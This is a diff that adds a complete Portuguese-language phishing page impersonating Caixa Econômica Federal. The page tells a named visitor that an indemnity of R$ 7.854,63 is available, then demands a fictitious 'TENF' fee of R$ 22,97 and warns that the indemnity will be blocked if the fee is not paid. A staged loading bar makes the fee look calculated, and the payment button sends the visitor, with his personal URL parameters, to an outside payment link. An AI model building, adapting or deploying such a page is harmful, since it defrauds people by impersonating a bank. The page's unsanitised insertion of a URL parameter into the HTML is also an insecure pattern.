@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="utf-8">
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Indenização Disponível - Caixa Econômica Federal</title>
+
+  <script>
+    localStorage.setItem("upsell", "up3");
+  </script>
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+  <style>
+    * {
+      margin: 0px;
+      padding: 0px;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f2f2f2;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .card,
+    .loading {
+      width: 100%;
+      overflow: hidden;
+    }
+
+    .topbar {
+      background-color: #005CA9;
+      color: white;
+      padding: 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: relative;
+    }
+
+    .user-info {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-size: 1rem;
+      font-weight: 500;
+    }
+
+    .user-info img {
+      width: 50px;
+      height: 50px;
+    }
+
+    .user-name {
+      position: absolute;
+      top: 3rem;
+      left: 1.5rem;
+      font-size: 1rem;
+      font-weight: 600;
+      margin-top: 3rem;
+    }
+
+    .icons {
+      display: flex;
+      gap: 1.5rem;
+    }
+
+    .icons img {
+      height: 24px;
+    }
+
+    .main-header {
+      background-color: #005CA9;
+      color: white;
+      padding: 1rem 1.5rem 2.5rem 1.5rem;
+    }
+
+    .indenizacao-info {
+      padding: 1rem;
+      text-align: start;
+      color: black;
+      font-weight: bold;
+    }
+
+    .indenizacao-info h2 {
+      font-size: 1.1rem;
+      margin-bottom: 0.5rem;
+      color: #005CA9;
+    }
+
+    .indenizacao-info p {
+      font-size: 1.1rem;
+      font-weight: bold;
+      color: #000;
+    }
+
+    .content {
+      padding: 1rem;
+      background-color: #fff;
+      margin: 0 1rem;
+      border-radius: 8px;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+    }
+
+    .alert {
+      background-color: #F39200;
+      color: white;
+      padding: 1rem;
+      font-weight: 400;
+      margin-bottom: 1rem;
+      border-radius: 8px;
+      font-size: 0.9rem;
+    }
+
+    .pendencia {
+      background-color: #e9f2fb;
+      padding: 1rem;
+      text-align: center;
+      border-radius: 8px;
+      margin-bottom: 1.5rem;
+      border: 1px solid #c8ddf0;
+    }
+
+    .pendencia h3 {
+      font-size: 1rem;
+      margin-bottom: 0.5rem;
+      font-weight: bold;
+      color: #005CA9;
+    }
+
+    .pendencia p {
+      font-size: 0.9rem;
+      line-height: 1.5;
+      color: #333;
+    }
+
+    .pendencia p strong {
+      color: #005CA9;
+    }
+
+    .button {
+      width: 100%;
+      background-color: #005CA9;
+      color: white;
+      border: none;
+      padding: 1rem;
+      font-size: 1rem;
+      font-weight: bold;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .button:hover {
+      background-color: #004a87;
+    }
+
+    /* LOADING */
+    .loading {
+      display: none;
+      flex-direction: column;
+      align-items: flex-start;
+      justify-content: flex-start;
+      background-color: #fff;
+      padding: 1rem 1.5rem;
+      gap: 1rem;
+      flex: initial;
+    }
+
+    .loading.active {
+      display: flex;
+    }
+
+    .status-text {
+      font-size: 1.2rem;
+      font-weight: 600;
+      color: #005CA9;
+      opacity: 1;
+      transition: opacity 0.5s ease;
+    }
+
+    .status-text.fade-out {
+      opacity: 0;
+    }
+
+    .progress-bar {
+      width: 100%;
+      max-width: 400px;
+      height: 6px;
+      background-color: #e0e0e0;
+      border-radius: 4px;
+      overflow: hidden;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      width: 0%;
+      background-color: #1875cc;
+      transition: width 0.1s linear;
+    }
+
+    /* Tela Final */
+    .final {
+      display: none;
+      flex-direction: column;
+      padding: 1.5rem;
+      gap: 1.5rem;
+      background-color: #fff;
+    }
+
+    .summary-card {
+      border: 2px solid #8000c8;
+      border-radius: 8px;
+      padding: 1rem;
+      text-align: center;
+    }
+
+    .summary-card h2 {
+      font-size: 1rem;
+      color: black;
+      margin-bottom: 0.5rem;
+    }
+
+    .summary-card p {
+      font-size: 1.2rem;
+      font-weight: bold;
+      color: black;
+    }
+
+    .info-box {
+      background-color: #efefef;
+      border-radius: 8px;
+      padding: 1rem;
+      font-size: 0.9rem;
+      color: #333;
+      line-height: 1.5;
+      text-align: center;
+    }
+
+    .final-button {
+      width: 100%;
+      background-color: #00c851;
+      color: white;
+      border: none;
+      padding: 1rem;
+      font-size: 1rem;
+      font-weight: bold;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .final-button:hover {
+      background-color: #00923c;
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- CARD PRINCIPAL -->
+  <div class="card active" id="card">
+    <div class="topbar">
+      <div class="user-info">
+        <img src="https://www.pngplay.com/wp-content/uploads/12/User-Avatar-Profile-PNG-Pic-Clip-Art-Background.png"
+          alt="Avatar">
+      </div>
+      <div class="icons">
+        <img src="images/3.svg" alt="icons">
+        <img src="images/4.svg" alt="icons">
+        <img src="images/5.svg" alt="icons">
+      </div>
+      <div class="user-name"><strong>Olá, Rafael</strong></div>
+    </div>
+
+    <div class="main-header"></div>
+
+    <!-- LOADING -->
+    <div class="loading" id="loading">
+      <div class="progress-bar">
+        <div class="progress-bar-fill" id="bar"></div>
+      </div>
+      <h2 class="status-text" id="status-text">Calculando sua Taxa TENF...</h2>
+    </div>
+
+    <div class="content-initial">
+      <div class="indenizacao-info">
+        <h2>Indenização disponível</h2>
+        <p>R$ 7.854,63</p>
+      </div>
+
+      <div class="content">
+        <div class="alert">
+          Atenção! <strong>Rafael dos Santos Almeida</strong>, leia a mensagem abaixo para liberar sua indenização
+        </div>
+
+        <div class="pendencia">
+          <h3>Pendência encontrada!</h3>
+          <p>
+            Para você receber o seu valor, é obrigatório realizar o pagamento do <strong>TENF (Taxa de Emissão de Nota
+              Fiscal).</strong>
+            O valor dessa taxa corresponde ao custo gerado por transferência de alto valor.
+            Clique no botão abaixo para calcular sua taxa TENF.
+          </p>
+        </div>
+
+        <button class="button" onclick="calcularTaxa()">Calcular TAXA</button>
+      </div>
+    </div>
+
+    <div class="final" id="final">
+      <div class="summary-card">
+        <h2>TENF (Taxa de Emissão de Nota Fiscal)</h2>
+        <p>R$ 22,97</p>
+      </div>
+
+      <div class="info-box">
+        Para você receber o seu valor, é obrigatório realizar o pagamento do TENF (Taxa de Emissão de Nota Fiscal).
+        O valor dessa taxa corresponde ao custo gerado por transferência de alto valor. Após o pagamento,
+        a transferência será feita para sua chave PIX cadastrada.
+        Caso não conclua o pagamento, sua indenização será bloqueada.
+      </div>
+
+      <button class="final-button" onclick="efetuarPagamento()">Efetuar o pagamento</button>
+    </div>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search)
+    const nomeCompleto = params.get("nome") || "Nome não informado"
+    const primeiroNome = nomeCompleto.trim().split(" ")[0]
+
+    document.querySelector(".user-name").innerHTML = `<strong>Olá, ${primeiroNome}</strong>`
+    document.querySelector(".alert strong").textContent = nomeCompleto
+
+    function calcularTaxa() {
+      document.querySelector(".content-initial").style.display = "none";
+      document.getElementById("loading").classList.add("active");
+
+      const bar = document.getElementById("bar");
+      const statusText = document.getElementById("status-text");
+      let progress = 0;
+      let trocado = false;
+
+      const interval = setInterval(() => {
+        if (progress >= 100) {
+          clearInterval(interval);
+          document.getElementById("loading").classList.remove("active");
+          document.getElementById("final").style.display = "flex";
+        } else {
+          progress++;
+          bar.style.width = progress + "%";
+
+          if (progress === 70 && !trocado) {
+            trocado = true;
+            statusText.classList.add('fade-out');
+            setTimeout(() => {
+              statusText.textContent = "Gerando seu comprovante...";
+              statusText.classList.remove('fade-out');
+            }, 500);
+          }
+        }
+      }, 30);
+    }
+
+    function efetuarPagamento() {
+      var currentUrlParams = window.location.search;
+      window.location.href = "https://go.zeroonepay.com.br/e1uesipux3" + currentUrlParams;
+    }
+  </script>
+
+
+
+</body>
+
+</html>
